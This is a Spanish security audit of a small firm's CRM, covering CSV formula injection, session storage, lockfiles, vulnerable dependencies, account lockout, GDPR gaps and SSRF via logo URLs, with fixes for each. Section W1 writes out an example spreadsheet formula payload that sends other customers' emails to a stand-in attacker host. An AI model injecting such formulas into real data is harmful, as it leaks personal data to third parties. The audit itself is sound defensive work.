# 05 · Seguridad web y cadena de suministro

Auditoría del CRM de DTI S.L. (RONOCA DESARROLLOS S.L.), 20-10-2026. Complementa a
`04-seguridad-app.md`: lo que ya está allí (S1–S13) no se repite. Solo se cita cuando cambia la
gravedad o cuando un hallazgo nuevo depende de él.

## Alcance y límites

- **Revisado en el código:** puntos de inyección de HTML (`dangerouslySetInnerHTML`, `srcDoc`,
  `innerHTML`, `href` dinámicos), plantillas de correo y su vista previa, generación de PDF
  (jsPDF), exportaciones CSV y JSON, redirecciones y `window.open`, almacenamiento de la sesión en
  el navegador, `previewAuthStorage.ts`, el límite de intentos de inicio de sesión
  (`20260921100000_rate_limit_login.sql`), `src/server.ts` y `src/start.ts`, los _buckets_ de
  almacenamiento, `npm audit`, `package-lock.json`, `bun.lock`, `bunfig.toml`, el flujo de CI y
  `auditoria_enmascarar()`.
- **No revisado (no tengo acceso):** producción, el panel de Supabase (hooks activos, límites de
  intentos, duración de la sesión, región del proyecto, plan contratado), el alojamiento
  (Cloudflare o Vercel: `docs/rendimiento/plan.md` también lo deja sin confirmar; la captura 8
  apunta a Vercel), los contratos
  con proveedores y la política de privacidad de las tiendas. Lo que depende de eso va marcado
  **«a comprobar»**. Las capturas de `images/` no las he usado: tratan de pantallas y cifras, no de
  seguridad. No he cambiado código ni aplicado nada.
- **RGPD:** es una revisión técnica, no un dictamen jurídico. Los plazos legales que cito
  (conservación de facturas) hay que confirmarlos con la gestoría.

## Estado a 21-10-2026 (añadido por el director de operaciones)

Describe la aplicación **tal como estaba el 20-10**. Comprobado en el código de la rama
`claude/crm-dtf-app-review-ftg3di` (nada desplegado):

| Id | Estado |
| --- | --- |
| W1 | Arreglado: `src/dominio/csv.ts` neutraliza las celdas que empiezan por `= + - @`, tabulador o retorno |
| W2 | En parte: ya hay cabeceras y CSP (en modo «solo informar»). Falta MFA y pasar la CSP a obligatoria |
| W3 | **Abierto**: `bun.lock` sigue con 62 paquetes del registro de Lovable y sin `nodemailer`. Pista nueva: la captura 8 tiene abierta una pestaña «Deployments – Vercel», así que producción probablemente se despliega en Vercel (el `CLAUDE.md` dice que la compilación por defecto apunta a Cloudflare). Hay que mirar en Vercel la orden de instalación |
| W4 | **Abierto** (igual que S3) |
| W5, W6, W7, W10, W11 | Abiertos; casi todo son decisiones o ajustes de panel |
| W8 | Arreglado: la descarga del logo no sigue redirecciones ni pide direcciones internas |
| W9 | Arreglado: la URL de seguimiento tiene que ser `https` |
| W12 | **Abierto**: la CI sigue con `npm ci --no-audit` y sin paso de auditoría |

## Resumen

| Id  | Gravedad                    | Hallazgo                                                                                                     |
| --- | --------------------------- | ------------------------------------------------------------------------------------------------------------ |
| W1  | **Media**                   | Inyección de fórmulas en los CSV: nombres y correos de clientes de WooCommerce sin neutralizar               |
| W2  | **Media**                   | Tokens de sesión (incluido el de refresco) en `localStorage`, sin CSP: cualquier XSS o paquete malicioso se lleva la sesión |
| W3  | **Media** (a comprobar)     | `bun.lock` desfasado y apuntando a un registro privado: si producción se compila con bun, no es lo que verifica la CI |
| W4  | **Alta** (ya en S3)         | `npm audit --omit=dev`: 5 avisos, 3 altos. Solo `nodemailer` es explotable en producción                     |
| W5  | **Media**                   | El bloqueo por cuenta tras 5 fallos permite dejar fuera a los tres socios a voluntad                        |
| W6  | Media                       | RGPD: sin procedimiento para acceso, supresión ni plazos de conservación; la auditoría guarda datos personales para siempre |
| W7  | Baja                        | Sesión sin caducidad por inactividad y sin cambio de contraseña en la aplicación                            |
| W8  | Baja                        | El servidor descarga cualquier `logo_url` de marcas textil, tiendas y facturas (SSRF limitado a administradores) |
| W9  | Baja                        | URL de seguimiento sin validar: va al correo del cliente y a una nota de WooCommerce que el cliente recibe  |
| W10 | Baja                        | Restos de Lovable en el navegador: intermediario de sesión hacia `lovable.dev` e informe de errores          |
| W11 | Baja                        | Datos personales enviados a Anthropic y a otros encargados: falta documentarlo                               |
| W12 | Proceso                     | CI sin `npm audit`, sin Dependabot y con _actions_ fijadas por etiqueta; herramientas de compilación en `dependencies` |

**Lo que está bien:**

- **XSS.** Los dos `dangerouslySetInnerHTML` son seguros: `chart.tsx` (shadcn, colores del
  código) y `GUION_TEMA` en `__root.tsx` (constante). `guionConfigPublica()` escapa `<`, U+2028 y
  U+2029. No hay `innerHTML`, `document.write` ni Markdown renderizado.
- **Plantillas de correo.** `renderizarPlantilla()` (`src/dominio/plantillas.ts`, con pruebas)
  escapa las variables al rellenar el HTML. El HTML lo escribe un administrador, nunca el cliente.
  La vista previa va en un `<iframe sandbox="">` sin scripts ni mismo origen.
- **PDFs.** jsPDF escribe texto y no interpreta HTML: un nombre de cliente con `<script>` sale
  impreso tal cual. `jspdf.html()` no se usa, así que el aviso de `dompurify` no es alcanzable.
  El logo de las **plantillas** se limita al _bucket_ `logos` del proyecto.
- **Redirecciones abiertas: ninguna.** Los `redirect`/`navigate` van a rutas fijas (`/panel`,
  `/auth`). No se lee ningún `?redirect=`/`next` de la URL. Los `window.open` abren URLs firmadas
  que devuelve el propio servidor.
- **CSRF.** Las _server functions_ se autentican con `Authorization: Bearer` (`auth-attacher.ts`),
  no con cookie: otra web no puede lanzarlas en nombre del usuario.
- **_Buckets_.** `compras`, `facturas` y `presupuestos` son privados, con URL firmada de 10 min.
  `logos` es público para leer, y solo un administrador puede escribir en él.
- **`package-lock.json`.** Sus 588 paquetes salen de `registry.npmjs.org`, todos con `integrity`.
  La CI instala con `npm ci`.
- **Cerrar sesión** (`supabase.auth.signOut()`) usa el alcance global por defecto y revoca el token
  de refresco en todos los dispositivos.

---

## W1 · Inyección de fórmulas en los CSV — Media

`textoCSV()` (`src/lib/csv.ts`) solo duplica las comillas. No neutraliza las celdas que empiezan
por `=`, `+`, `-`, `@`, tabulador o retorno de carro. `PedidosTable.tsx` (líneas 372-404) exporta
`cliente_nombre` y `cliente_email` **tal como llegan de WooCommerce**, y esos campos los rellena
cualquiera en el formulario de compra de la tienda.

**Escenario:** un cliente se registra en la web con el nombre
`=HYPERLINK("https://atacante.example/?d="&E2&E3;"Ver pedido")`. Alguien de DTI exporta los
pedidos del mes y abre el CSV con Excel o LibreOffice. La celda se convierte en un enlace que, al
pulsarlo, manda a un tercero los correos de otros clientes. Con fórmulas DDE en versiones antiguas
se puede llegar a ejecutar órdenes (Excel moderno pide confirmación). Afecta a todas las pantallas
que usan `descargarCSV` con datos de clientes.

**Arreglo:** una función pura `celdaSegura()` en `src/dominio/` con sus pruebas: si la celda es
texto y empieza por `= + - @ \t \r`, se le antepone `'`. Que `textoCSV()` la aplique a todas las
celdas de texto, no a los números, que tienen que seguir sumando en Excel. Así queda arreglado en
un solo sitio.

## W2 · Sesión en `localStorage` y sin CSP — Media

`client.ts` crea el cliente de Supabase con `persistSession: true`, y `brokeredPreviewStorage()`
devuelve `localStorage` fuera de Lovable. El token de acceso (1 h) y el **de refresco, que no
caduca mientras se use**, se pueden leer desde cualquier JavaScript que corra en el origen del CRM.
No hay CSP que lo frene (S5 sigue pendiente: `src/server.ts` no añade ninguna cabecera).

Hoy no he encontrado ninguna XSS. El riesgo está en lo que vendrá: un fallo futuro o, sobre todo,
**un paquete npm comprometido** que llegue al _bundle_ del cliente (hay 60 dependencias directas de producción, y
radix, recharts o jspdf van al navegador). Ese código lee el token de refresco y lo manda fuera.
Como no hay MFA (S4) y los tres usuarios son administradores, eso es control total y duradero:
caja, bancos, facturación y credenciales de WooCommerce a través de las _server functions_.

**Arreglo, por orden de coste:**

1. **CSP** (S5) con `script-src 'self'` más _hash_ de los dos guiones en línea, `connect-src` solo
   hacia el dominio de Supabase y `frame-ancestors 'none'`. Una CSP no impide leer
   `localStorage`, pero sí cargar código de fuera y sacar el token a un dominio ajeno.
2. **MFA obligatorio** (S4): un token robado de nivel `aal1` deja de valer en el middleware.
3. A medio plazo, sesión en cookie `HttpOnly` con `@supabase/ssr`. Es un cambio grande que afecta
   a `auth-attacher.ts` y al middleware: mejor como tarea propia.

## W3 · `bun.lock` desfasado con registro privado — Media (a comprobar)

- `bun.lock` está versionado y no se ha tocado desde `b78c67a` (2-9-2026). Fija 62 paquetes a
  `europe-west1-npm.pkg.dev/lovable-core-prod/...`. Además, **ni siquiera cuadra con
  `package.json`**: no contiene `nodemailer`, `@anthropic-ai/sdk` ni `juice`.
- `bunfig.toml` trae una protección de 24 h contra versiones recién publicadas, pero **excluye
  justo los cuatro paquetes `@lovable.dev/*`**. Y solo actúa con bun, que no se usa.
- `@lovable.dev/vite-tanstack-config@2.13.1` (fijado, bien) monta **toda** la compilación: plugins,
  inyección de `VITE_*` y preset de nitro. Es un proveedor único con mucho poder sobre lo que se
  despliega.

**Escenario:** si el despliegue de producción se compila desde el repositorio con bun (el
alojamiento de Lovable, o una plataforma que detecta `bun.lock` antes que `package-lock.json`),
la aplicación que corre en producción se resuelve con un árbol de dependencias distinto del que
verifica la CI, y desde un registro que nadie de DTI controla. Con `bun.lock` desfasado, ese árbol
ni siquiera está fijado. **No sé qué compila producción:** es lo primero que hay que mirar.

**Arreglo:**

1. Comprobar en el panel del alojamiento la orden de instalación y compilación (debe ser `npm ci`
   y `npm run build`).
2. Con autorización de Javier, borrar `bun.lock` y `bunfig.toml` en una rama. No borra datos, pero
   cambia cómo se instala.
3. Una prueba en `src/arquitectura/` o un paso de CI que falle si reaparece `bun.lock` o si
   `package-lock.json` tiene un `resolved` fuera de `registry.npmjs.org`.

## W4 · Dependencias vulnerables — Alta (ya en S3)

`npm audit --omit=dev`, hoy:

| Paquete         | Gravedad | Llega por                                         | ¿Alcanzable en producción?                                               |
| --------------- | -------- | ------------------------------------------------- | ------------------------------------------------------------------------ |
| `nodemailer` 9.1.1 | Alta  | directa                                           | **Sí.** Mezcla de credenciales SMTP entre tiendas y DoS por destinatarios. Arreglo: 10.1.7 (versión mayor) |
| `vite` 8.2.2    | Alta     | `@tailwindcss/vite`, `@tanstack/*`                | No: es de desarrollo en Windows (`launch-editor`)                         |
| `source-map-js` 1.2.1 | Alta | `@tailwindcss/node`, `juice → postcss`           | Solo si se procesan _source maps_ ajenos; no es el caso                   |
| `fast-uri` 3.1.7 | Moderada | `@hookform/resolvers → ajv`                      | Muy improbable                                                           |
| `dompurify` 3.4.14 | Baja   | `jspdf`                                           | No: `jspdf.html()` no se usa                                             |

Con las dependencias de desarrollo aparece además **`shell-quote` crítica**, que llega por
`@lovable.dev/vite-tanstack-config → @tanstack/devtools-vite → launch-editor`. Solo afecta al
servidor de desarrollo.

`vite`, `@tailwindcss/vite`, `@tanstack/router-plugin` y `vite-tsconfig-paths` están en
`dependencies` aunque son de compilación, y eso ensucia el `--omit=dev`. **Arreglo:** la tarea de
dependencias de S3 (`nodemailer@^10.1.7` y `npm audit fix` para el resto), y pasar las
herramientas de compilación a `devDependencies`.

## W5 · El bloqueo por cuenta deja fuera a los socios — Media

`hook_password_verification_attempt` bloquea una cuenta 15 minutos tras 5 fallos en 15 minutos,
aunque luego se escriba bien la contraseña. Está pensado contra la fuerza bruta y en eso cumple.
Pero con tres usuarios y correos fáciles de adivinar, cualquiera que sepa el correo de un socio
puede escribir 5 contraseñas malas cada 15 minutos y **dejarle sin entrar todo el día**, sin
necesidad de saber nada más. Lo mismo con los tres a la vez, en plena jornada de producción.

Además, **a comprobar:**

- si el hook está activado en el panel (la migración avisa de que hace falta un paso a mano), y si
  el plan contratado de Supabase incluye ese tipo de hook;
- el límite por IP de «Sign in with password» en Authentication → Rate Limits;
- que «Prevent use of leaked passwords» esté activo.

Las contraseñas de alta solo piden 8 caracteres (`admin.functions.ts`, `z.string().min(8)`).

**Arreglo:**

1. Activar el CAPTCHA nativo de Supabase Auth (Turnstile o hCaptcha) en el inicio de sesión. No
   necesita Edge Functions: se pasa `options.captchaToken` en `signInWithPassword`. Frena la
   fuerza bruta automática sin bloquear al dueño de la cuenta.
2. Cambiar el bloqueo duro por un retraso creciente, o bloquear solo cuando además falle el
   CAPTCHA.
3. MFA (S4): con segundo factor, adivinar la contraseña ya no basta y el bloqueo por cuenta deja de
   hacer falta.
4. Subir el mínimo de contraseña a 12 caracteres.

## W6 · RGPD — Media

Datos personales que guarda el CRM: nombre, correo, teléfono, dirección y NIF de clientes (muchos
son autónomos, es decir, personas físicas), los mismos datos congelados en
`receptor_snapshot` de cada factura, las imágenes y PDFs de presupuestos, y los correos enviados
(`pedido_correos_enviados`).

Lo que falta:

- **Supresión y acceso.** No hay ninguna función para atender una petición de acceso, de
  portabilidad o de supresión de un cliente. `textil.functions.ts` borra clientes textil, pero el
  `DELETE` deja la fila entera en `auditoria.antes`, que es _append-only_ y está encadenada por
  hash. `auditoria_enmascarar()` solo oculta secretos (claves, contraseñas, tokens), no datos
  personales. Resultado: **hoy no se puede borrar de verdad a nadie.**
- **Plazos de conservación.** No hay ninguno definido. Los datos de quien tiene factura se pueden
  conservar los años que marca la normativa mercantil y tributaria (a confirmar con la gestoría).
  Pero los clientes que solo pidieron presupuesto, los correos enviados y las imágenes de
  presupuesto no tienen ese amparo y se quedan para siempre.
- **Exportación para análisis** (`export-analisis.ts`): incluye `cliente_nombre`. Si ese JSON se
  sube a un asistente de IA externo, sale un dato personal sin necesidad.

**Arreglo (necesita decisión de Javier, no solo código):**

1. Definir los plazos: facturas y sus _snapshots_, el plazo legal; presupuestos sin venta, por
   ejemplo 2 años; imágenes de presupuesto y registro de correos, por ejemplo 1 año.
2. Una función SQL `cliente_anonimizar(_usuario_id, _cliente_id)` que sustituya nombre, correo,
   teléfono y dirección **en los registros que no son factura** y deje constancia en la auditoría.
   La auditoría no se toca: su base jurídica es el interés legítimo y la obligación de control, y
   eso hay que dejarlo escrito en el registro de actividades. Como alternativa para el futuro,
   ampliar `auditoria_enmascarar()` a `email`, `telefono` y `direccion` en las tablas de clientes,
   sabiendo que se pierde detalle en el log. Esa decisión le toca a Javier.
3. En la exportación para análisis, sustituir el nombre del cliente por un seudónimo estable (un
   hash del id) por defecto.
4. Una pantalla o un procedimiento escrito para atender peticiones de acceso en el plazo de un mes.

## W7 · Sesión sin caducidad por inactividad — Baja

La sesión no caduca mientras el navegador siga abierto o vuelva a abrirse: el token de refresco se
renueva solo (`autoRefreshToken: true`). Si se usa en el ordenador del taller o en el móvil de un
socio, quien lo tenga delante entra como administrador. Tampoco hay en la aplicación ni cambio de
contraseña ni «cerrar las demás sesiones».

**Arreglo:** en Supabase → Auth → Sessions, fijar un tiempo de inactividad y una duración máxima
(a comprobar si el plan lo permite). Si no, cerrar la sesión en el cliente tras N horas sin
actividad. Y añadir en el perfil el cambio de contraseña (`supabase.auth.updateUser`) y un botón de
«cerrar en todos los dispositivos».

## W8 · Descarga de logos sin restringir el origen — Baja

`descargarLogo()` (`src/lib/logo-descarga.ts`) hace `fetch(url)` **en el servidor** al emitir
facturas (`emisor_snapshot.logo_url`), presupuestos (`tiendas.logo_url`) y documentos textil
(`textil_marcas.logo_url`). En `textil.functions.ts:99` ese campo se valida como
`z.string()` sin más, y se escribe a mano en `textil/ajustes.tsx`. `fetch` sigue redirecciones.
El informe 04 da por cerrado el SSRF por los logos, pero eso solo vale para el logo **de la
plantilla** (`logoDelProyecto()`).

**Escenario:** un administrador, o una sesión que aproveche S1 si llega a escribir en
`textil_marcas`, pone como logo una dirección interna del alojamiento. El servidor la pide en cada
emisión. Solo devuelve algo si responde con un tipo de imagen, pero la petición sale igual, y cada
PDF espera hasta 5 s si el servidor no contesta.

**Arreglo:** reutilizar `logoDelProyecto()` también para `tiendas.logo_url` y
`textil_marcas.logo_url` al guardar, y con `redirect: "error"` en `descargarLogo`. **Rapidez:**
guardar el logo ya convertido en una caché en memoria por URL, para no volver a descargarlo en cada
factura de una tanda. «Facturar» emite varios documentos seguidos con el mismo logo.

## W9 · URL de seguimiento sin validar — Baja

`setPedidoTracking` acepta `url: z.string()`. El valor va a `{{seguimiento_url}}` en el correo al
cliente (escapado como HTML, pero sin comprobar el esquema) y a una nota de WooCommerce con
`customer_note: true`, que el cliente recibe por correo. En la pantalla, React 19 ya neutraliza
`javascript:` en `href`, pero un error al pegar (un `http://` en vez de `https://`, o una dirección
de otro sitio) llega directo al cliente.

**Arreglo:** `z.string().url()` y solo `https:`. Opcionalmente, una lista de dominios de
transportistas conocidos, con aviso (no bloqueo) si no coincide.

## W10 · Restos de Lovable en el navegador — Baja

Lovable está congelado, pero siguen activos:

- `previewAuthStorage.ts`: en dominios `*.lovable.app`, `*.lovableproject.com` y similares, y
  dentro de un marco, **envía el token de sesión por `postMessage` al editor de `lovable.dev`**.
  Comprueba el origen y es código de Lovable, pero si la aplicación se sigue abriendo desde una URL
  de vista previa de Lovable, el token sale hacia un tercero.
- `lovable-error-reporting.ts` manda errores a `window.__lovableEvents` si el alojamiento inyecta
  ese objeto. Los mensajes de error pueden llevar datos (S9).

**Arreglo:** confirmar que producción no se sirve desde un dominio de Lovable. Si es así, en una
rama, que `client.ts` use `localStorage` directamente y quitar `reportLovableError`. Las cabeceras
dicen «generated, do not edit», pero desde la fase 1 ya se editan a mano (`client.ts` lo hace).

## W11 · Encargados del tratamiento sin documentar — Baja

Salen datos personales hacia:

- **Anthropic** (EE. UU.): PDFs de facturas de proveedores, que pueden ser autónomos con NIF, e
  imágenes o PDFs de presupuestos de clientes.
- **Supabase**: la región está **a comprobar**.
- **El alojamiento** (Cloudflare o Vercel).
- **El servidor SMTP** de cada tienda.
- Posiblemente **Lovable**.

**Arreglo:** firmar o aceptar el DPA de cada uno, comprobar que hay cláusulas tipo o el marco UE-EE. UU.
para Anthropic, anotar todos en el registro de actividades y nombrarlos en la política de
privacidad de las tiendas. Para Anthropic, revisar si conviene la retención cero de la API.

## W12 · Higiene de la cadena de suministro — Proceso

- `.github/workflows/verificar.yml` instala con `npm ci --no-audit` y no hay ningún paso de
  auditoría.
- No hay Dependabot ni Renovate.
- `actions/checkout@v4` y `actions/setup-node@v4` están fijadas por etiqueta, no por SHA.
- La protección contra versiones recién publicadas de `bunfig.toml` no tiene equivalente en npm.

**Arreglo:**

1. Un paso `npm audit --omit=dev --audit-level=high` que falle la CI. Hoy fallaría por
   `nodemailer`, que es justo lo que se busca.
2. Dependabot con `cooldown` de unos días para npm y para GitHub Actions.
3. Fijar las _actions_ por SHA.

---

## Estado de los puntos de seguridad de `docs/pendiente_auditoria.md`

| Punto                          | Estado visto en el código                                                                   |
| ------------------------------ | ------------------------------------------------------------------------------------------- |
| MFA                            | Pendiente (S4). Rebaja W2 y W5                                                              |
| Actualizar `nodemailer`        | Pendiente (S3, W4)                                                                          |
| Cabeceras CSP/HSTS/X-Frame     | Pendiente (S5): `src/server.ts` sigue sin añadir ninguna                                    |
| Límite de intentos de inicio de sesión | Hecho en SQL. **A comprobar** que el hook está activo. Tiene el efecto secundario de W5 |

## Orden recomendado

1. **Sin código, hoy:** comprobar qué compila producción (W3), que el hook y el límite por IP están
   activos (W5), la región de Supabase y la caducidad de la sesión (W7), y que producción no se sirve
   desde un dominio de Lovable (W10).
2. **Rama «dependencias»:** S3/W4 (`nodemailer` 10 y `npm audit fix`), herramientas de compilación
   a `devDependencies`, quitar `bun.lock` y `bunfig.toml` con permiso, y W12 en la CI.
3. **Rama «CSV seguro»:** W1. Es pequeña, va en `src/dominio/` con pruebas y tapa la única vía en
   la que hoy un dato que escribe un desconocido llega a ejecutarse en un ordenador de DTI.
4. **Rama «sesión»:** MFA (S4), CSP (S5) y CAPTCHA (W5). Juntas cierran W2.
5. **W8 y W9** (validación de URLs) en una rama pequeña.
6. **RGPD (W6, W11):** primero la decisión de plazos y el registro de actividades. Después, la
   función de anonimizar.
